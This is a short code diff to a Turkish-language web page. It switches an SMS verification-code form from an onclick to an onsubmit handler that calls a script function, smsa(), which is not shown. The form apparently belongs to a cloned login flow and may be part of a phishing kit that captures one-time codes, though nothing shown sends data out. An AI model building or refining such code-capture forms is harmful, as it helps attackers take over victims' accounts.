@@ -1070,7 +1070,7 @@ document.getElementById('maximizeButton').addEventListener('click', maximizeTawk
                   <sms-modal>
                      <div class="sms-modal">
                         <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
-                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid" id="smsForm" action="javascript:;" onclick="smsa()">
+                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid" id="smsForm" action="javascript:;" onsubmit="smsa()">
                            <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
                            <button type="submit" class="btn">Giriş</button>
                         </form>
